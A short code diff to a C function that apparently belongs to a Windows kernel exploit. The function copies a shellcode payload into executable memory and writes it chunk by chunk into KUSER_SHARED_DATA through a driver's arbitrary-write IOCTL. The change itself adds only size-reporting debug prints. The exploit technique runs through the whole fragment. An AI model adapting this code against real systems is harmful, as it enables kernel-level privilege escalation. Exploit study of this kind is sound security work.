@@ -306,6 +306,7 @@ void *GenerateShellCode(HANDLE driverHandle)
     oldPayloadSize = payloadSize;
 
     printf("[+] Shellcode is located at %p\n",KUSER_SHARED_DATA );
+    printf("[+] Shellcode size: %i\n",payloadSize);
 
     payloadRemander = payloadSize % 8; 
     payloadSizeInEight = (int ) (payloadSize / 8);
@@ -319,13 +320,14 @@ void *GenerateShellCode(HANDLE driverHandle)
         payloadSize += payloadPadding; 
     }
 
+    printf("[+] Shellcode size with padding: %i\n",payloadSize);
     shellcode= VirtualAlloc(0,payloadSize+10, 0x3000,0x40); 
 
     RtlMoveMemory(shellcode,payload,oldPayloadSize);
 
-
     for (int i = 0; i < payloadSizeInEight;i+=8)
     {
+        
         SendToDriver(driverHandle,0x0022200B,(void*) ( ( (unsigned long long)shellcode)+i), (void*) (((unsigned long long)KUSER_SHARED_DATA)+i) );
     }
 
